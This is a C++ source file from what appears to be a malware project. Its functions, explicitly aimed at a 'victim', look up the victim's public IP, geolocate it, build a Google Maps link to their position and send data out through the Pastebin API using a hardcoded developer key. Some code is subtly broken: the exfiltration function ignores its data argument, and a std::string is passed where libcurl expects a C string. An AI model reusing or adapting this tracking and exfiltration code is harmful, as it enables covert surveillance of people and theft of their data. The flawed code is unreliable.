/*
 *
 * This File handle the location fetching and the pastebin exfiltration 
 *
 */

#include "outsideTheBox.h"


namespace OutsideTheBox {
  namespace { // private function
    size_t writer(char *ptr, size_t size, size_t size_of_data, void *data)
    {
      std::string *str = (std::string *) data;
      int i;

      for(i = 0; i < size * size_of_data; i++)
      {
        (*str) += ptr[i];
      }

      return size * size_of_data;
    }
  }

  CURL * init() {
    CURL *hnd;

    std::string victimIPLocation;

    hnd = curl_easy_init();
    curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
    curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/8.11.1");
    curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
    curl_easy_setopt(hnd, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_2TLS);
    curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
    curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 0L);
    curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, writer);

    return hnd;
  }

  std::string getVictimsIp(CURL *hnd) {
    CURLcode ret;
    std::string victimIP;
    std::string retData {"None"};
    
    curl_easy_setopt(hnd, CURLOPT_URL, "https://api.ipify.org/");
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &victimIP);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = victimIP;
    }
    
    return retData;
  }

  std::vector<std::string> getVictimsIpLatLon(std::string IPLocation) {
    std::vector<std::string> latLon {"", ""};

    long unsigned int latFirstIndex {IPLocation.find("\"lat\":")};
    long unsigned int lonFirstIndex {IPLocation.find("\"lon\":")};
    long unsigned int lonFirstIndexDelimiter {IPLocation.find(",\"timezone\"")};

    long unsigned int latCount {lonFirstIndex - latFirstIndex};
    long unsigned int lonCount {lonFirstIndexDelimiter - lonFirstIndex};


    std::string lat {IPLocation.substr(latFirstIndex + 6, latCount - 7)};
    std::string lon {IPLocation.substr(lonFirstIndex + 6, lonCount - 6)};

    latLon[0] = lat;
    latLon[1] = lon;

    return latLon;
  }

  std::string getVictimsIpLocationInfos(CURL *hnd, std::string IP) {
    CURLcode ret;
    std::string victimIPLocation;
    std::string retData {"None"};

    std::string locationApiUrl = "http://ip-api.com/json/" + IP;
    
    curl_easy_setopt(hnd, CURLOPT_URL, locationApiUrl.c_str());
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &victimIPLocation);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = victimIPLocation;
    }
    
    return retData;
  }

  std::string getVictimsIpLocationMaps(std::string IPlat, std::string IPlon) {
    std::string mapsLink {"https://maps.google.com/?q="};

    std::cout << IPlat << '\n';
    std::cout << IPlon << '\n';
    // add latitude
    mapsLink += IPlat;

    // add comma delimiter
    mapsLink += ',';

    // add longitude
    mapsLink += IPlon;


    return mapsLink;
  }

  std::string dataExf(CURL* hnd, std::string data) {
    CURLcode ret;
    std::string pastebinLink;
    std::string retData {"None"};
    std::string api_dev_key = "OJGIqow0k46Ek-O1kE0mpxQQkdwcndMq";
    //std::string api_paste_code = "just some random text you :)"; // your paste text  
    std::string api_paste_code = "just%20some%20random%20text%20you%20%3A%29"; // your paste text  
    char api_paste_private = '2'; // 0=public 1=unlisted 2=private
    std::string api_paste_name = "test"; // name or title of your paste
    std::string api_paste_expire_date = "10M";
    std::string api_paste_format = "php";
    std::string api_user_key = ""; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
    //std::string api_paste_name			= urlencode($api_paste_name);
    //std::string api_paste_code			= urlencode($api_paste_code);
    std::cout << "\n\n\n" << "api_option=paste&api_user_key=" + api_user_key + "&api_paste_private=" + api_paste_private + "&api_paste_name=" + api_paste_name + "&api_paste_expire_date=" + api_paste_expire_date + "&api_paste_format=" + api_paste_format + "&api_dev_key=" + api_dev_key + "&api_paste_code=" + api_paste_code + "" << "\n\n\n";

    curl_easy_setopt(hnd, CURLOPT_POST, true);
    curl_easy_setopt(hnd, CURLOPT_POSTFIELDS, "api_option=paste&api_user_key=" + api_user_key + "&api_paste_private=" + api_paste_private + "&api_paste_name=" + api_paste_name + "&api_paste_expire_date=" + api_paste_expire_date + "&api_paste_format=" + api_paste_format + "&api_dev_key=" + api_dev_key + "&api_paste_code=" + api_paste_code + "");
    curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1);
    curl_easy_setopt(hnd, CURLOPT_NOBODY, 0);
    curl_easy_setopt(hnd, CURLOPT_URL, "https://pastebin.com/api/api_post.php");
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &pastebinLink);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = pastebinLink;
    }

    return retData;
  }

  void cleanup(CURL * hnd) {
    curl_easy_cleanup(hnd);
    hnd = NULL;
  }
}